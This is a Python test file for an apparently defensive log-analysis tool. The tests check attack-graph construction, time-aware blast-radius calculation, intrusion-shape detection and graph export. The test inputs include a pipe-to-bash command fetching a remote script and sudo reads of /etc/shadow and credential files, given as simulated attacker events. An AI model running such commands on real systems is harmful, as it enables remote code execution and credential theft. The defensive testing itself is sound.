"""Phase 8 — attack-path graphing and blast radius.

The blast-radius tests carry the weight here. A graph traversal that ignores edge
direction, edge type, or time will happily report a number, and the number will be
wrong in a direction that makes an incident look worse than it was — which is how
an operator learns to stop believing the tool.
"""

from __future__ import annotations

import pytest

from sentinel.graph import AttackGraph, build_graph, extract_paths, summarise
from sentinel.schemas import LogEvent

T0 = "2026-07-30T05:30:00Z"


def event(ts: str = T0, **kwargs) -> LogEvent:
    defaults = {
        "raw_sha256": kwargs.get("raw_sha256", f"h{ts}{kwargs.get('user', '')}{kwargs.get('source_ip', '')}"),
        "timestamp": ts,
        "severity": "warning",
        "score": 54,
        "host": "sentinel",
    }
    defaults.update(kwargs)
    return LogEvent(**defaults)


def at(minute: int, second: int = 0) -> str:
    return f"2026-07-30T05:{minute:02d}:{second:02d}Z"


class TestExtractPaths:
    def test_finds_absolute_paths(self):
        assert extract_paths("cat /etc/.backup_credentials") == ["/etc/.backup_credentials"]

    def test_skips_ubiquitous_binaries(self):
        # /bin/bash appears in half of all sudo lines and says nothing.
        assert extract_paths("/bin/bash -c 'id'") == []

    def test_ignores_flags_and_urls(self):
        assert extract_paths("curl -s http://198.51.100.9/x.sh | bash") == []

    def test_handles_empty(self):
        assert extract_paths("") == []

    def test_caps_the_count(self):
        command = " ".join(f"/opt/data/file{i}" for i in range(20))
        assert len(extract_paths(command)) <= 5


class TestBuildGraph:
    def test_login_creates_a_typed_edge(self):
        graph = build_graph([event(source_ip="203.0.113.45", user="arron", outcome="success")])
        assert graph.edges[("source_ip:203.0.113.45", "user:arron", "auth_success")].count == 1

    def test_failure_and_success_are_different_edges(self):
        graph = build_graph([
            event(source_ip="1.2.3.4", user="a", outcome="failure"),
            event(source_ip="1.2.3.4", user="a", outcome="success", raw_sha256="x"),
        ])
        kinds = {kind for (_s, _d, kind) in graph.edges}
        assert kinds == {"auth_failure", "auth_success"}

    def test_only_success_grants_access(self):
        graph = build_graph([
            event(source_ip="1.2.3.4", user="a", outcome="failure"),
            event(source_ip="1.2.3.4", user="b", outcome="success", raw_sha256="x"),
        ])
        assert graph.edges[("source_ip:1.2.3.4", "user:b", "auth_success")].grants_access
        assert not graph.edges[("source_ip:1.2.3.4", "user:a", "auth_failure")].grants_access

    def test_sudo_becomes_an_escalation_edge(self):
        graph = build_graph([event(
            user="arron", process="sudo",
            fields={"target_user": "root", "command": "/bin/cat /etc/shadow"},
        )])
        assert ("user:arron", "user:root", "escalated_to") in graph.edges
        assert ("user:root", "file:/etc/shadow", "accessed") in graph.edges

    def test_repeated_interactions_are_counted_not_duplicated(self):
        events = [event(at(30, i), source_ip="1.2.3.4", user="a", outcome="failure",
                        raw_sha256=f"h{i}") for i in range(5)]
        graph = build_graph(events)
        assert len(graph.edges) == 1
        assert next(iter(graph.edges.values())).count == 5

    def test_node_carries_peak_severity(self):
        graph = build_graph([
            event(source_ip="1.2.3.4", user="a", severity="warning", score=54),
            event(source_ip="1.2.3.4", user="a", severity="critical", score=97, raw_sha256="x"),
        ])
        assert graph.nodes["source_ip:1.2.3.4"].peak_severity == "critical"

    def test_honeytoken_is_tagged(self):
        graph = build_graph([event(
            source_ip="1.2.3.4", user="admin_backup",
            fields={"honeytoken": "admin_backup", "honeytoken_kind": "user"},
        )])
        assert "honeytoken" in graph.nodes["user:admin_backup"].tags

    def test_empty_input_is_an_empty_graph(self):
        graph = build_graph([])
        assert graph.nodes == {} and graph.shapes() == []


class TestBlastRadius:
    def _chain_graph(self) -> AttackGraph:
        """source → arron → root → /etc/secret, in chronological order."""
        return build_graph([
            event(at(30), source_ip="203.0.113.45", user="arron", outcome="success", raw_sha256="a"),
            event(at(31), user="arron", process="sudo", raw_sha256="b",
                  fields={"target_user": "root", "command": "/bin/cat /etc/secret"}),
        ])

    def test_follows_the_chain(self):
        radius = self._chain_graph().blast_radius("source_ip:203.0.113.45", max_hops=4)
        labels = set(radius)
        assert "user:arron" in labels
        assert "user:root" in labels
        assert "file:/etc/secret" in labels

    def test_hop_counts_are_correct(self):
        radius = self._chain_graph().blast_radius("source_ip:203.0.113.45", max_hops=4)
        assert radius["source_ip:203.0.113.45"] == 0
        assert radius["user:arron"] == 1
        assert radius["user:root"] == 2

    def test_max_hops_truncates(self):
        radius = self._chain_graph().blast_radius("source_ip:203.0.113.45", max_hops=1)
        assert "user:arron" in radius
        assert "user:root" not in radius

    def test_failed_logins_do_not_extend_the_radius(self):
        # The number an operator needs is what the attacker reached, not what
        # they knocked on.
        graph = build_graph([
            event(at(30), source_ip="1.2.3.4", user="victim", outcome="failure", raw_sha256="a"),
            event(at(31), user="victim", process="sudo", raw_sha256="b",
                  fields={"target_user": "root", "command": "/bin/cat /etc/secret"}),
        ])
        radius = graph.blast_radius("source_ip:1.2.3.4", max_hops=4)
        assert "user:victim" not in radius, "a failed login granted nothing"
        assert len(radius) == 1

    def test_ignores_edges_that_predate_the_attacker(self):
        # The failure mode that makes naive attack graphs over-report: root ran a
        # cron job before the intrusion, and plain reachability claims the
        # attacker touched it.
        graph = build_graph([
            event(at(10), user="root", process="cron", raw_sha256="old",
                  fields={"command": "/usr/local/bin/nightly-backup"}),
            event(at(30), source_ip="203.0.113.45", user="arron", outcome="success", raw_sha256="a"),
            event(at(31), user="arron", process="sudo", raw_sha256="b",
                  fields={"target_user": "root", "command": "/etc/attacker-loot"}),
        ])
        radius = graph.blast_radius("source_ip:203.0.113.45", max_hops=5)
        reached = {graph.nodes[n].label for n in radius}
        assert "/etc/attacker-loot" in reached
        assert "/usr/local/bin/nightly-backup" not in reached, "walked backwards through time"

    def test_time_constraint_can_be_disabled(self):
        graph = build_graph([
            event(at(10), user="root", process="cron", raw_sha256="old",
                  fields={"command": "/usr/local/bin/nightly-backup"}),
            event(at(30), source_ip="203.0.113.45", user="arron", outcome="success", raw_sha256="a"),
            event(at(31), user="arron", process="sudo", raw_sha256="b",
                  fields={"target_user": "root", "command": "/etc/loot"}),
        ])
        radius = graph.blast_radius("source_ip:203.0.113.45", max_hops=5, respect_time=False)
        assert "file:/usr/local/bin/nightly-backup" in radius

    def test_a_later_shortcut_does_not_truncate_the_radius(self):
        # Relaxation, not first-visit-wins: reaching `root` early via one route
        # must not freeze an arrival time that forbids onward edges.
        graph = build_graph([
            event(at(20), source_ip="1.2.3.4", user="root", outcome="success", raw_sha256="early"),
            event(at(40), user="root", process="bash", raw_sha256="late",
                  fields={"command": "/etc/late-loot"}),
        ])
        radius = graph.blast_radius("source_ip:1.2.3.4", max_hops=4)
        assert "file:/etc/late-loot" in radius

    def test_unknown_seed_is_empty_not_an_error(self):
        assert self._chain_graph().blast_radius("source_ip:9.9.9.9") == {}


class TestShapes:
    def test_star_is_detected(self):
        graph = build_graph([
            event(at(30, i), source_ip="203.0.113.45", user=u, outcome="failure", raw_sha256=f"h{i}")
            for i, u in enumerate(["admin", "oracle", "test", "root"])
        ])
        stars = [s for s in graph.shapes() if s.name == "star"]
        assert stars and stars[0].centre == "source_ip:203.0.113.45"
        assert len(stars[0].members) == 4

    def test_star_below_threshold_is_not_reported(self):
        graph = build_graph([
            event(at(30, i), source_ip="1.2.3.4", user=u, outcome="failure", raw_sha256=f"h{i}")
            for i, u in enumerate(["a", "b"])
        ])
        assert not [s for s in graph.shapes() if s.name == "star"]

    def test_a_successful_star_outranks_a_failed_one(self):
        failed = build_graph([
            event(at(30, i), source_ip="1.1.1.1", user=u, outcome="failure", raw_sha256=f"f{i}")
            for i, u in enumerate(["a", "b", "c"])
        ]).shapes()[0]
        succeeded = build_graph(
            [event(at(30, i), source_ip="2.2.2.2", user=u, outcome="failure", raw_sha256=f"s{i}")
             for i, u in enumerate(["a", "b", "c"])]
            + [event(at(31), source_ip="2.2.2.2", user="a", outcome="success", raw_sha256="win")]
        ).shapes()[0]
        assert succeeded.score > failed.score
        assert succeeded.severity == "critical"

    def test_funnel_is_detected(self):
        # Many sources on one account: chosen, not swept up.
        graph = build_graph([
            event(at(30, i), source_ip=f"203.0.113.{i}", user="arron",
                  outcome="failure", raw_sha256=f"h{i}")
            for i in range(1, 5)
        ])
        funnels = [s for s in graph.shapes() if s.name == "funnel"]
        assert funnels and funnels[0].centre == "user:arron"

    def test_chain_is_detected(self):
        graph = build_graph([
            event(at(30), source_ip="203.0.113.45", user="arron", outcome="success", raw_sha256="a"),
            event(at(31), user="arron", process="sudo", raw_sha256="b",
                  fields={"target_user": "root", "command": "/etc/secret"}),
        ])
        chains = [s for s in graph.shapes() if s.name == "chain"]
        assert chains
        assert len(chains[0].members) >= 3

    def test_bridge_is_detected(self):
        # One account successfully accessed from two unrelated origins.
        graph = build_graph([
            event(at(30), source_ip="203.0.113.1", user="deploy", outcome="success", raw_sha256="a"),
            event(at(31), source_ip="198.51.100.9", user="deploy", outcome="success", raw_sha256="b"),
        ])
        bridges = [s for s in graph.shapes() if s.name == "bridge"]
        assert bridges and bridges[0].centre == "user:deploy"
        assert bridges[0].severity == "critical"

    def test_shapes_are_bilingual(self):
        graph = build_graph([
            event(at(30, i), source_ip="203.0.113.45", user=u, outcome="failure", raw_sha256=f"h{i}")
            for i, u in enumerate(["admin", "oracle", "test"])
        ])
        for shape in graph.shapes():
            assert shape.description_en and shape.description_ja
            assert any(ord(ch) > 0x3000 for ch in shape.description_ja)

    def test_quiet_traffic_produces_no_shapes(self):
        graph = build_graph([event(at(30), source_ip="192.168.1.5", user="arron", outcome="success")])
        assert graph.shapes() == []


class TestExport:
    def test_dot_is_wellformed(self):
        graph = build_graph([event(source_ip="1.2.3.4", user="arron", outcome="success")])
        dot = graph.to_dot()
        assert dot.startswith("digraph sentinel {") and dot.rstrip().endswith("}")
        assert dot.count("->") == len(graph.edges)

    def test_dot_escapes_quotes(self):
        graph = build_graph([event(user='we"ird', process="bash",
                                   fields={"command": '/tmp/a"b'})])
        assert '\\"' in graph.to_dot()

    def test_to_dict_shape(self):
        graph = build_graph([event(source_ip="1.2.3.4", user="arron", outcome="success")])
        payload = graph.to_dict(seed="source_ip:1.2.3.4", max_hops=2)
        assert payload["stats"]["nodes"] == len(graph.nodes)
        assert payload["blast_radius"]["seed"] == "source_ip:1.2.3.4"
        assert payload["kind_order"][0] == "source_ip"
        assert all("hops" in n for n in payload["nodes"])

    def test_to_dict_without_a_seed_has_no_radius(self):
        graph = build_graph([event(source_ip="1.2.3.4", user="a", outcome="success")])
        assert graph.to_dict()["blast_radius"] is None

    def test_networkx_export_is_optional_and_explains_itself(self):
        graph = build_graph([event(source_ip="1.2.3.4", user="a", outcome="success")])
        try:
            import networkx  # noqa: F401
        except ImportError:
            with pytest.raises(RuntimeError, match="optional"):
                graph.to_networkx()
        else:
            assert graph.to_networkx().number_of_nodes() == len(graph.nodes)


class TestAgainstTheDemoFixture:
    def test_reconstructs_the_intrusion(self, engine):
        graph = engine.attack_graph()
        names = {s.name for s in graph.shapes()}
        assert "star" in names, "the brute-force fan-out should be visible"
        assert "chain" in names, "the completed kill chain should be visible"

    def test_the_star_centres_on_the_attacker(self, engine):
        graph = engine.attack_graph()
        star = next(s for s in graph.shapes() if s.name == "star")
        assert star.centre == "source_ip:203.0.113.45"

    def test_blast_radius_excludes_pre_attack_activity(self, engine):
        graph = engine.attack_graph()
        radius = graph.blast_radius("source_ip:203.0.113.45", max_hops=4)
        reached = {graph.nodes[n].label for n in radius}
        # certbot ran via cron before the attack; root is a shared node.
        assert "/usr/bin/certbot" not in reached
        assert "/etc/.backup_credentials" in reached, "the canary file WAS reached"

    def test_summary_is_compact(self, engine):
        info = summarise(engine.attack_graph())
        assert info["nodes"] > 0 and len(info["shapes"]) <= 5
